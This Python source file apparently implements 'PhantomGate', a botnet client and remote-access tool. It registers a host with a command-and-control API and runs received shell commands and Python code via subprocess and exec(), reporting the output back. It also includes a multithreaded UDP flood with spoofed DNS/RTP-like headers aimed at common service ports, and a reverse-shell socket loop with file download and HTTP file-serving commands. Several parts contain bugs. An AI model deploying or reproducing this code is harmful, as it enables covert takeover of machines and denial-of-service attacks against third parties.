"""
PhantomGate.py

A multi-purpose remote administration and botnet utility with features such as:
- Remote command execution via API
- UDP flood (DoS testing) with adaptive rate control
- Target registration and management using SQLite
- File transfer and simple HTTP server for file sharing
- Botnet instruction retrieval and execution
- Cross-platform support (Windows, Linux, Android detection)
- Command output reporting to a central API
This script is designed to be run as a standalone application, providing a command-line interface for interacting with a remote API server.

Usage:

    python PhantomGate.py

Main Features:
    - Registers the client (target) with a central API server
    - Periodically polls for instructions (commands, botnet actions)
    - Executes received commands and reports output
    - Supports UDP flood and custom botnet actions
    - Provides file transfer and directory navigation utilities

API Endpoints (default: http://127.0.0.1:5000):
    /api/registor_target         Register a new target
    /api/ApiCommand/<target>     Get commands for a target
    /api/Apicommand/save_output  Post command output
    /api/BotNet/<target>         Get botnet instructions
    /api/get_instraction/<target>Get instructions for a target

Author: (Unknown)
"""

from sys import platform
import socketserver
import http.server
import subprocess
import contextlib
import threading
import requests
import sqlite3
import logging
import string
import random
import socket
import time
import io
import os

BLUE, RED, WHITE, YELLOW, MAGENTA, GREEN, END = '\33[94m', '\033[91m', '\33[97m', '\33[93m', '\033[1;35m', '\033[1;32m', '\033[0m'

# os.system("clear")
def opratingSystem():
    """
    Determines the operating system of the current machine.
    Returns:
        str: The name of the operating system (e.g., 'Windows', 'Linux', 'Android').
    """
    if platform == "win32":
        return 'Windows'
    else:
        is_android = CMD('getprop ro.build.version.release')
        if is_android == 'android decoding str is not supported':
            return 'linux'
        else:
            return f'android {is_android}'


def get_ip():
    """
    Retrieves the local IP address of the machine.
    Returns:
        str: The local IP address of the machine.
    """
    s = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
    try:
        s.connect(('8.8.8.8',80))
        ip = s.getsocketname()[0]
    except Exception as e:
        ip = socket.gethostbyname(socket.gethostname())

    s.close()

    return ip


# Shared Data for Tracking
packet_counts = {}  
lock = threading.Lock()  
stop_event = threading.Event()  

def send_udp_flood(thread_id, ports,TARGET_IP,PACKET_SIZE,FAKE_HEADERS,BASE_DELAY,ADAPTIVE_THRESHOLD,MIN_DELAY,MAX_DELAY):
    """
    Sends UDP flood packets to the target IP on specified ports.
    Args:
        thread_id (int): Identifier for the thread.
        ports (list): List of ports to target.
        TARGET_IP (str): The target IP address.
        PACKET_SIZE (int): Size of each UDP packet.
        FAKE_HEADERS (list): List of fake headers to use in packets.
        BASE_DELAY (float): Base delay between packet sends.
        ADAPTIVE_THRESHOLD (int): Threshold for adaptive rate control.
        MIN_DELAY (float): Minimum delay for adaptive control.
        MAX_DELAY (float): Maximum delay for adaptive control.
    """
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    delay = BASE_DELAY  
    packet_count = 0  

    while not stop_event.is_set():  # Stop when the event is set
        for target_port in ports:  # Loop through all ports
            if stop_event.is_set():  
                break  # Stop immediately if the stop event is triggered

            message = random.choice(FAKE_HEADERS) + random._urandom(PACKET_SIZE - len(FAKE_HEADERS[0]))  

            try:
                sock.sendto(message, (TARGET_IP, target_port))
                packet_count += 1
            except Exception as e:
                print(f"[Thread {thread_id}] Error: {e}")
                break  

            # Update shared packet count
            with lock:
                packet_counts[thread_id] = packet_count  

            # Adaptive Rate Control
            if packet_count % ADAPTIVE_THRESHOLD == 0:
                delay = max(MIN_DELAY, min(MAX_DELAY, delay * random.uniform(0.8, 1.2)))  

            time.sleep(delay)  


# Command Interface
def command_interface(threads):
    while True:
        cmd = input("\nEnter command (status / stop): ").strip().lower()
        
        if cmd == "status":
            with lock:
                print("\n[Thread Status]")
                for tid, count in packet_counts.items():
                    print(f"Thread {tid}: {count} packets sent")
        
        elif cmd == "stop":
            print("\nStopping all threads...")
            stop_event.set()  
            for t in threads:
                t.join()  
            print("All threads stopped. Exiting.")
            break

# udp-flood(socket)
def udpFlood(TARGET_IP,THREAD_COUNT=5,PACKET_SIZE = 1024):
    """
    Initiates a UDP flood attack on the specified target IP with multiple threads.
    Args:
        TARGET_IP (str): The target IP address to flood.
        THREAD_COUNT (int): Number of threads to use for the flood.
        PACKET_SIZE (int): Size of each UDP packet to send.
    """
    # deffult port
    ports = [
        21, # FTP
        22, # SSH
        23, # Telnet
        25, # SMTP
        53, # DNS(UDP)
        80, # HTTP
        110, # POP3
        123, # NTP(UDP)
        143, # IMAMP
        161, # SNMP(UDP)
        443, # HTTPS
        445, # SMB
        993, # IMAPS
        995, # POP3S
        3389, # RDP
        5060, # SIP(VoIP)
        8080, # Alternative HTTP
    ]

    # Adaptive Rate Control
    BASE_DELAY = 0.01  
    ADAPTIVE_THRESHOLD = 100  
    MIN_DELAY, MAX_DELAY = 0.05, 0.1  
    # Spoofed Protocol Data (Mimicking DNS/VoIP)
    FAKE_HEADERS = [
            b"\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00",  # DNS-like query
            b"\x80\x00\x00\x00\x00\x01\x00\x00\x00\x00",  # VoIP RTP header
            b"\x00\x00\x00\x00\x00\x00\x00\x00",  # Generic header
        ]
    # Start Threads
    threads = []
    for i in range(THREAD_COUNT):  
        t = threading.Thread(target=send_udp_flood, args=(i, ports,TARGET_IP,PACKET_SIZE,FAKE_HEADERS,BASE_DELAY,ADAPTIVE_THRESHOLD,MIN_DELAY,MAX_DELAY), daemon=True)
        t.start()
        threads.append(t)
        packet_counts[i] = 0
    command_interface(threads)


# setting varible
buit_in_command = ['lib','server','excute_code']
apiToken = "GKEGff99ZQo3gR2gCfCaSNCZq5NgvJpe5Byb37mmer8J5FUL4kjkVwuVjfxxghoX0OBREZR7jgweCXuscYKKdeu6bxpyNDsJ65uCmDBN2rap3n5eej3pZPYKR0ROmXkDoA1FWjpCvzPDS3w81fiCMwNxfpqegwMyWvzT5Nr5vlyv7FT9oJKrlVZHutPYuWXbMyss6qWD"

logger = logging.getLogger(__name__)

def ID(n=5):
        """
        Generates a random alphanumeric ID of length 5. This ID can be used
        for creating unique identifiers for entities in the system, such as users,
        events, or records.

        Returns:
            str: A randomly generated 5-character string consisting of uppercase letters,
                 lowercase letters, and digits.
        """
        RandomID = ''.join(
            random.choices(
                string.ascii_uppercase + string.ascii_lowercase + string.digits, k=n
            )
        )
        return RandomID


def targetData(command, user_name=None, ID=None):
    """
    Manages target data in a SQLite database.
    Args:
        command (str): The command to execute ('create_target' or 'get').
        user_name (str, optional): The name of the target to create.
        ID (str, optional): The unique identifier for the target.
    Returns:
        str or list: A message indicating success or failure for 'create_target',
                     or a list of all target data for 'get'.
    """
    conn = sqlite3.connect('info.db')
    cursour = conn.cursor()

    cursour.execute("""
        CREATE TABLE IF NOT EXISTS target_data(
            id TEXT PRIMARY KEY NOT NULL,
            target_name TEXT NOT NULL,
            is_registor text
        )
    """)

    if command == 'create_target' and user_name != None and ID != None:
        try:

            cursour.execute('INSERT INTO target_data(id, target_name,is_registor) VALUES(?,?,?)',(ID,user_name,'0'))
            conn.commit()
            return "Target was created succssefuly"
        
        except Exception as e:

            print(e)
            return "Something went wronge"
        
    elif command == "get":

        cursour.execute("SELECT * FROM target_data")
        data = cursour.fetchall()
        return data


def libApi(token,usePyload,save=True):
    """
    Retrieves a Python script from a local API server and optionally saves it to a file.
    Args:
        token (str): The API token for authentication.
        usePyload (str): The name of the script to retrieve.
        save (bool): Whether to save the script to a file (default is True).
    Returns:
        dict or str: A dictionary with a message if saved, or the script text if not saved.
                     Returns 'invalid' if the request fails.
    """
    args = {"token": token,'ip': get_ip(),'os':opratingSystem(),'pyload': usePyload}

    try:
        GET = requests.get(f'http://127.0.0.1:5000/api/lib/{usePyload}',params=args)

    except:
        return 'Error'
    
    response = GET.json()
    valid = GET.status_code

    if valid == 200:
        if save:
            with open(f'{usePyload}.py','w',encode='utf-8') as f:
                f.write(response.text)
            return {'message':f'file saved.name={usePyload}.py'}
        return {'message':response.text}
    
    return 'invalid'


def code_excuter(script):
    """
    Executes a Python script and captures its output.
    Args:
        script (str): The Python script to execute.
    Returns:
        str: The output of the executed script or an error message if execution fails.
    """
    try:
        output_buffer = io.StringIO()
        with contextlib.redirect_stdout(output_buffer):
            exec(script)

        output = output_buffer.getvalue()
        return output
    except:
        return "Error executing code. Please check the script for errors."
def CMD(com):
    """
    Executes a command in the shell and returns its output.
    Args:
        com (str): The command to execute.
    Returns:
        str: The output of the command or an error message if execution fails.
    """

    if com not in buit_in_command:
        try:
            cmd = subprocess.run(com, shell=True, capture_output=True, text=True)
            output_bytes = cmd.stderr + cmd.stdout
            output_string = str(output_bytes,'utf-8')
            cmd_data = output_string
            
        except Exception as e:
            output_string = str(output_bytes)
            cmd_data = output_string

        if len(cmd_data) == 0:
            cmd_data = 'done!'
        return cmd_data
    else:
        if com.startswith('excute_code') and not len(com) == 11:
            return code_excuter(com[11:])
        elif com.startswith('server'):
            ...
        if com.startswith('ls'):
            ls = os.listdir('.')
            return ls



def apiCommandGet(token,target_name):
    """
    Retrieves commands for a specific target from the API.
    Args:
        token (str): The API token for authentication.
        target_name (str): The name of the target to retrieve commands for.
    Returns:
        list: A list of commands for the target, or 'invalid' if the request fails.
    """
    args = {"token": token,'ip': get_ip(),'os':opratingSystem()}

    try:
        GET = requests.get(f'http://127.0.0.1:5000/api/ApiCommand/{target_name}',params=args)

    except:
        return 'Error'
    
    response = GET.json()
    valid = GET.status_code

    if valid == 200:
        return response['allCommand']
    
    return 'invalid'
      

#3=cmd,target_name=2
def apiCommandPost(token,data,target_name):
    """
    Posts command output to the API for a specific target.
    Args:
        token (str): The API token for authentication.
        data (list): A list of tuples containing command IDs and their outputs.
        target_name (str): The name of the target to post command output for.
    Returns:
        dict: A dictionary containing the response from the API, or 'Invalid' if the request fails.
    """
    # data is all command recived from the api
    params= {
        'token': token,
        'target_name': target_name,
        'output': [],
        'ip': get_ip(),
        'os':opratingSystem()
    }
    # cmd[0] is the id of the command
    for cmd in data:
        output = CMD(com=cmd[3])
        # sending cmd output and cmd id
        params['output'].append((cmd[0],output))
    
    POST = requests.post('http://127.0.0.1:5000/api/Apicommand/save_output',json=params)
    response = POST.json()
    valid = POST.status_code

    if valid == 200:
        return response
    
    return 'Invalid'


def BotNet(target_name,apiToken):
    """
    Retrieves botnet instructions for a specific target from the API.
    Args:
        target_name (str): The name of the target to retrieve botnet instructions for.
        apiToken (str): The API token for authentication.
    Returns:
        tuple: A tuple containing the botnet instructions (udpflood, bruteFroce, customBotNet) or 'empty' if no instructions are available.
    """
    botNet = requests.get(f'http://127.0.0.1:5000/api/BotNet/{target_name}',params={'token':apiToken,'ip':get_ip(),'os':opratingSystem()})

    if botNet.status_code == 200:

        if botNet.json()['message'] == 'good':

            udpflood = botNet.json()['udp-flood']
            bruteFroce = botNet.json()['brute-froce']
            customBotNet = botNet.json()['custom-BotNet']

            return udpflood,bruteFroce,customBotNet
    
        elif botNet.json()['message'] == 'bad':
            return 'empty'
        
    else:

        logger.info('[botNet Invalid]')
        return 'error'



def Registor(target_name, apiToken):
    """
    Registers a new target with the API.
    Args:
        target_name (str): The name of the target to register.
        apiToken (str): The API token for authentication.
    Returns:
        dict: A dictionary containing the registration response from the API, or an error message if registration fails.
    """
    info = {
        'token': apiToken,
        'target_name': target_name,
        'os': opratingSystem(),
        'ip': get_ip()
    }
    print(target_name)
    try:
        # Sending the POST request to register the target
        POST = requests.post("http://127.0.0.1:5000/api/registor_target", json=info)
        # Check if the status code is 200
        if POST.status_code == 200:
            targetData(command='create_target', user_name=POST.json()['target_name'])
            return POST.json()
    except requests.exceptions.RequestException as e:
        return f"Error during registration: {str(e)}"



def Instarction(target_name, apiToken):
    """
    Retrieves instructions for a specific target from the API.
    Args:
        target_name (str): The name of the target to retrieve instructions for.
        apiToken (str): The API token for authentication.
    Returns:
        dict: A dictionary containing the instructions for the target, or an error message if the request fails.
    """
    info = {
        'token': apiToken,
        'ip': get_ip(),
        'os':opratingSystem()
    }
    try:
        # Sending the GET request to retrieve instructions
        GET = requests.get(f"http://127.0.0.1:5000/api/get_instraction/{target_name}", params=info)
        if GET.status_code == 200:
            instruction = GET.json()
            return instruction
        else:
            return {
                'error': f"Unexpected status code {GET.status_code}",
                'details': GET.json()
            }
    except requests.exceptions.RequestException as e:
        return {
            'error': 'RequestException occurred',
            'details': str(e)
        }



def apiMain():
    """
    Main function to handle the API interaction and command execution loop.
    It retrieves target information, processes instructions, and executes commands
    based on the retrieved instructions.
    """
    while True:
        # Retrieve target info
        target_info = targetData(command='get')
        delay = 5

        if len(target_info) != 0:
            target_name = target_info[0][1]
            instraction = Instarction(target_name=target_name, apiToken=apiToken)
            print(instraction)
            # Ensure instraction is valid
            if isinstance(instraction, dict) and 'error' not in instraction:
                delay = int(instraction.get('delay', 5))  # Default to 5 if no delay is found

                if instraction['instraction'].replace(' ','') == 'connectToWeb':
                    cmd = apiCommandGet(target_name=target_name, token=apiToken)
                    result = apiCommandPost(token=apiToken, target_name=target_name, data=cmd)

                    if result == 'Invalid':
                        logger.info(f'[apiCommandPost Invalid] {result}')

                elif instraction['instraction'] == 'botNet':
                    botNet = BotNet(target_name=target_name, apiToken=apiToken)

                    if botNet not in ['error', 'no instraction yet']:
                        udpflood, bruteFroce, customBotNet = botNet

                        if udpflood != 'Inactive':
                            udpflood()
                        elif bruteFroce != 'Inactive':
                            # Handle bruteForce action
                            pass
                        elif customBotNet != 'Inactive':
                            # Handle customBotNet action
                            pass
                        else:
                            logger.info('[botNet Invalid] No valid botnet commands')

                    else:
                        logger.info(f'[botNet Invalid] {botNet}')
                    return  # Exiting after handling botNet (can be adjusted based on logic)

                else:
                    pass
            else:
                logger.info(f'[apiCommandPost Error] {instraction}')

        else:
            # Handle case where no target info is available
            user_name = ID(n=10)
            data = Registor(target_name=user_name, apiToken=apiToken)
            if data == 'error':
                logger.info(f'Error during registration: {data}')
            else:
                print(data)
                if data != None:
                    registor_target = targetData(command='create_target', ID=ID(n=5), user_name=data['target_name'])
                    if registor_target == "Target was created successfully":
                        logger.info(f'Target {data["name"]} was successfully registered')
                    else:
                        logger.info(f'Failed to register target: {registor_target}')

        # Wait before repeating the process
        time.sleep(delay)


def get_host_port(s1):
    """
    Extracts the IP and PORT from a string formatted as 'IP:PORT'.
    Args:
        s1 (str): The string containing the IP and PORT.
    Returns:
        tuple: A tuple containing the IP and PORT as strings.
    """
    for i in range(0,len(s1)):
        if s1[i] == ":":
            IP = s1[:i]
            PORT = s1[i+1:]

    return IP,PORT

def dir_chacker(_pwd):
    """
    Checks the current working directory and returns the path without the leading directory.
    Args:
        _pwd (str): The command to get the current working directory.
    Returns:
        str: The current working directory without the leading directory.
    """
    cmd = subprocess.Popen(_pwd,shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE,stdin=subprocess.PIPE)
    bytes = cmd.stdout.read() + cmd.stderr.read()
    string = str(bytes)
    pwd = string[2:-3]
    ch_point = []

    for x in range(len(pwd)):
        if pwd[x] == "/":
            ch_point.append(x)
    
    f = ch_point[-1] + 1
    ch_point.clear()
    return pwd[f:]
    
    
def server_target(IP, PORT):
    """
    Starts a simple HTTP server to serve files from the current directory.
    Args:
        IP (str): The IP address to bind the server to.
        PORT (int): The port number to bind the server to.
    """
    #creating request handler with variable name handler
    handler = http.server.SimpleHTTPRequestHandler
    #binding the request with the ip and port as httpd
    with socketserver.TCPServer((IP, int(PORT)), handler) as httpd:
        messeage = YELLOW+"Server started at  -> "+IP+":"+PORT+END
        #running the server
        httpd.serve_forever()
            
def send(com,_port):
        """
        Sends a file over a socket connection.
        Args:
            com (str): The path to the file to be sent.
            _port (int): The port number to connect to.
        """
        _s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        host = socket.gethostname()

        try:
            print(_port)
            _s.connect((host,_port))
        except Exception as e:
            pass
        try:
            file_size = str(os.path.getsize(com))
            _s.send(str.encode(file_size))
        
            with open(com,"rb") as files:

                while True:
                    data = files.read(1024)
                    if not (data):
                        break
                    _s.send(data)
        except:
            _s.close()

def main():
    """
    Main function to establish a socket connection and handle commands.
    It connects to a server, retrieves the current working directory,
    and listens for commands to execute, change directories, or start a server.
    """
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    try:
        port, host = 0, 0  # placeholder for api_host_geter()
        time.sleep(1)
        s.connect((host, port))

        _pwd = "echo %cd%" if platform == "win32" else "pwd"
        pwd = dir_chacker(_pwd)
        s.send(pwd.encode())

        while True:
            data = s.recv(1024)
            if not data:
                break

            command = data.decode("utf-8").strip()

            if command in ("exit", "quite"):
                break

            elif command.startswith("cd "):
                path = command[3:].strip()
                try:
                    os.chdir(path)
                    pwd = dir_chacker(_pwd)
                    msg = f"-pwd@-{pwd}"
                except Exception:
                    msg = f"{RED}\n[!][!] Oops! no such directory: {path}{END}"
                s.send(msg.encode())

            elif command.startswith("server "):
                s1 = command[7:].strip()
                IP, PORT = get_host_port(s1)
                message = f"{GREEN}server is running on: {END}{MAGENTA}{IP}:{PORT}{END}"
                threading.Thread(target=server_target, args=(IP, PORT)).start()
                s.send(message.encode())

            elif command.startswith("download "):
                com = command[9:].strip()
                _port = port - 1
                send(com, _port)

            else:
                if command.startswith("ls"):
                    command = f"ls --color {command[3:].strip()}"
                try:
                    proc = subprocess.Popen(command, shell=True,
                                            stdout=subprocess.PIPE,
                                            stderr=subprocess.PIPE,
                                            stdin=subprocess.PIPE)
                    output_bytes = proc.stdout.read() + proc.stderr.read()
                    output_string = output_bytes.decode("utf-8").strip()
                except Exception as e:
                    output_string = f"{RED}[!] Command execution failed: {e}{END}"

                if not output_string:
                    output_string = f"{GREEN}[   {END}{YELLOW}>_< {END}{GREEN}  [DONE!!!]  ]{END}"

                s.send(output_string.encode())

    except Exception as e:
        print(f"[!] Connection error: {e}")
    finally:
        s.close()


if __name__ == '__main__':
    apiMain()